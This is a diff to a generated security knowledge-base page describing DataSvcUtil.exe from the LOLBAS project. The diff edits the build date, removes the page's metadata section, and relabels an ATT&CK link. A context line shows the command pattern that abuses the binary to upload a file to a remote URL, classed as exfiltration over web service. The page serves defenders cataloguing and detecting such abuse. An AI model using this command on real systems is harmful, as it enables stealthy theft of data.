@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/DataSvcUtil.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "DataSvcUtil.exe"
@@ -19,16 +19,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# DataSvcUtil.exe
-
 DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2020-12-01
-- Author: Ialle Teixeira
-- Source Path: yml/OSBinaries/DataSvcUtil.yml
 
 ## Paths
 
@@ -47,7 +38,7 @@ DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
 - Use Case: Upload file
 - Privileges: User
 - Operating System: Windows 10
-- ATT&CK: [[kb/attack/techniques/T1567-exfiltration_over_web_service|T1567]]
+- ATT&CK: [[kb/attack/techniques/T1567-exfiltration_over_web_service|T1567: Exfiltration Over Web Service]]
 
 ## Detections
 
